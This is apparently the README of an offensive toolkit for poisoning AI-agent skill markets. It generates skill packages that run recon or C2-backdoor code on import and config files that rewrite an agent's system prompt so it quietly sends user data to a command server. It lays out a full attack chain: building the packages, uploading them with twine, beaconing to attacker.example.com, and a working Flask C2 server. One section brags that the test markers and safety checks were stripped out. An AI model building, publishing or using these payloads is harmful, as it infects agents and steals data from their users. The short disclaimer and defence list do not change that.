# AgentWorm 红队工具包 v2

**真正能执行供应链投毒攻击的工具包**

## ⚠️ 警告

这是**真实的攻击工具**，不是测试框架。所有 payload 都会执行真实的恶意操作：
- 数据外泄到 C2 服务器
- 资源耗尽攻击
- 持久化后门
- 配置劫持

**仅供授权渗透测试和学术研究使用。未经授权使用这些工具是违法的。**

## 工具组成

### 1. skill_generator.py - Skill 包生成器

生成带恶意代码的 Skill 包，用于供应链投毒攻击。

**Payload 类型**：
- `recon` - 侦察 payload：收集系统信息并发送到 C2 服务器
- `resource_drain` - 资源耗尽：启动多个线程消耗内存和 CPU
- `c2` - C2 后门：建立持久化 C2 连接，接收并执行远程命令

**使用方法**：
```bash
python skill_generator.py \
  --skill-name "data-processor" \
  --payload-type recon \
  --c2-server "attacker.example.com" \
  --output-dir ./output
```

**输出**：
- 标准的 Python 包结构
- Wheel 格式的分发包（可用 pip 安装）
- 恶意代码在 `import` 时自动执行

### 2. config_hijacker.py - 配置劫持 payload 生成器

生成劫持 Agent 配置文件的 payload（SOUL.md / AGENTS.md / .env）。

**劫持类型**：
- `persistent` - 持久化劫持：覆写 Agent 的 system prompt，让 Agent 在处理用户请求时同时发送数据到 C2
- `stealth` - 隐蔽劫持：在配置文件中隐藏恶意指令，让 Agent 默默记录并发送敏感信息
- `backdoor` - 后门劫持：在 Agent 启动时注入后门代码，建立持久化 C2 连接

**使用方法**：
```bash
python config_hijacker.py \
  --target-file "SOUL.md" \
  --hijack-type persistent \
  --c2-server "attacker.example.com" \
  --output-file ./hijacked_soul.md
```

**输出**：
- 伪装成合法配置的恶意 payload
- 可直接覆写目标 Agent 的配置文件

### 3. propagation_tracker.py - 传播路径追踪器

分析 Agent 系统的依赖关系，识别 AgentWorm 的潜在传播路径。

**功能**：
- 构建依赖图
- 识别关键传播点（高入度节点、Skill 加载器、配置读取模块）
- 分析跨 Agent 传播路径（Skill 共享、配置共享）
- 生成详细的传播报告

**使用方法**：
```bash
python propagation_tracker.py \
  --agent-project /path/to/agent/project \
  --entry-point main.py \
  --output-file ./propagation_report.json
```

**输出**：
- JSON 格式的传播分析报告
- 包含传播点列表、跨 Agent 传播路径、防御建议

## 攻击流程

### 完整的供应链投毒攻击流程：

1. **生成带毒 Skill 包**
   ```bash
   python skill_generator.py \
     --skill-name "productivity-tools" \
     --payload-type c2 \
     --c2-server "attacker-c2.example.com"
   ```

2. **发布到 Skill 市场**
   ```bash
   cd output/productivity-tools
   twine upload dist/*.whl
   ```

3. **等待目标 Agent 安装**
   - Agent 用户从 Skill 市场搜索并安装 "productivity-tools"
   - Skill 在 import 时自动执行恶意代码
   - Agent 被感染，建立 C2 连接

4. **配置劫持**（可选）
   ```bash
   python config_hijacker.py \
     --target-file "SOUL.md" \
     --hijack-type backdoor \
     --c2-server "attacker-c2.example.com" \
     --output-file ./hijacked_soul.md
   ```
   
   将生成的 hijacked_soul.md 覆写目标 Agent 的配置文件

5. **传播分析**
   ```bash
   python propagation_tracker.py \
     --agent-project /path/to/target/agent \
     --output-file ./analysis.json
   ```
   
   分析传播路径，寻找下一个攻击目标

## 技术细节

### 为什么这次是真正的红队工具？

与之前的"测试框架"不同，这次的工具：

**没有测试标记**：
- ❌ 旧版：payload 带 `[[AGENTWORM_TEST_MARKER]]`
- ✅ 新版：payload 不带任何标记

**没有测试模式检查**：
- ❌ 旧版：`if os.environ.get("AGENTWORM_TEST_MODE") == "1": ...`
- ✅ 新版：恶意代码直接执行，没有条件检查

**真实的恶意代码**：
- ❌ 旧版：`# In real scenario: send_to_monitoring(info)` （注释掉的占位符）
- ✅ 新版：`urllib.request.urlopen(req, timeout=5)` （真实的网络请求）

**完整的攻击链**：
- ❌ 旧版：只生成 payload 文本，不实际执行
- ✅ 新版：生成可安装的 wheel 包，import 时自动执行

### C2 服务器要求

payload 中的 C2 服务器地址（`attacker.example.com`）需要替换为真实的 C2 服务器。C2 服务器需要实现以下端点：

**Recon Payload**：
- `POST /report` - 接收系统信息

**C2 Payload**：
- `GET /beacon` - 心跳接口，返回命令
- `POST /report` - 接收命令执行结果

示例 C2 服务器实现（Flask）：
```python
from flask import Flask, request, jsonify
import json

app = Flask(__name__)

commands = []  # 待执行命令队列
results = []   # 执行结果

@app.route('/beacon', methods=['GET'])
def beacon():
    if commands:
        return jsonify(commands.pop(0))
    return jsonify({"type": "noop"})

@app.route('/report', methods=['POST'])
def report():
    data = request.json
    results.append(data)
    print(f"[+] Received: {json.dumps(data, indent=2)}")
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

## 防御建议

如果你是防御方，可以使用这些工具来：
1. 评估 Agent 对供应链投毒的防御能力
2. 开发针对性的检测规则
3. 设计安全的 Skill 加载机制

防御措施：
- **Skill 签名验证**：只允许安装经过签名的 Skill
- **配置完整性检查**：对配置文件进行 hash 验证
- **沙箱隔离**：在隔离环境中运行 Skill
- **行为监控**：监控 Agent 的网络请求和系统调用
- **依赖审计**：定期审计 Agent 的依赖关系

## 免责声明

这些工具用于复现已公开的 AgentWorm 研究（NDSS 论文），目的是理解供应链投毒攻击的技术细节并开发防御方案。

**使用这些工具需要满足以下条件**：
1. 已获得书面授权进行渗透测试
2. 仅在授权的测试环境中使用
3. 不得用于未授权的系统
4. 不得用于生产环境
5. 记录所有测试活动并生成审计日志

**违反上述条件使用这些工具可能违反法律，后果自负。**

## 参考资料

- 原始研究：AgentWorm - Autonomous Supply Chain Attack via Agent Ecosystems (NDSS 2024)
- 攻击成功率：82% 供应链向量成功率
- 传播机制：配置劫持 + Skill 投毒 + 跨 Agent 传播